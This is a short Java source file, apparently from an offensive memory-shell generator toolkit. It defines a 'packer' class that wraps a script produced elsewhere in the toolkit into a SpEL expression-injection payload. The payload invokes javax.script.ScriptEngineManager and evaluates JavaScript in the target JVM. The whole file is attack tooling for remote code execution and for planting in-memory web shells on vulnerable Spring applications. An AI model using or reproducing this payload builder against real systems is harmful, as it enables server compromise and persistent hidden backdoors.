package org.leo.jmg.mem.packer.spel;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "SpELScriptEngine", group = "SpEL", order = 1)
public class SpELScriptEnginePacker implements Packer {
    String template = "T(javax.script.ScriptEngineManager).newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        return template.replace("{{script}}", script);
    }
}
